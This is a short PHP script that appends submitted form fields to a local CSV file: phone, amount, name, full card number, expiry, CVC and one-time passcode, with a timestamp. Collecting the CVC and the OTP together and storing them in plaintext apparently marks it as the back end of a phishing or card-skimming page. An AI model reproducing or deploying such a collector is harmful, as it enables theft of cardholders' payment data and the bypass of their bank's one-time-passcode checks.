<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = __DIR__ . '/data.csv';
    $data = [
        date('Y-m-d H:i:s'),
        $_POST['phone'] ?? '',
        $_POST['amount'] ?? '',
        $_POST['name'] ?? '',
        $_POST['card_number'] ?? '',
        $_POST['expiry'] ?? '',
        $_POST['cvc'] ?? '',
        $_POST['otp'] ?? ''
    ];
    $fp = fopen($file, 'a');
    fputcsv($fp, $data);
    fclose($fp);
    echo 'success';
}
?>
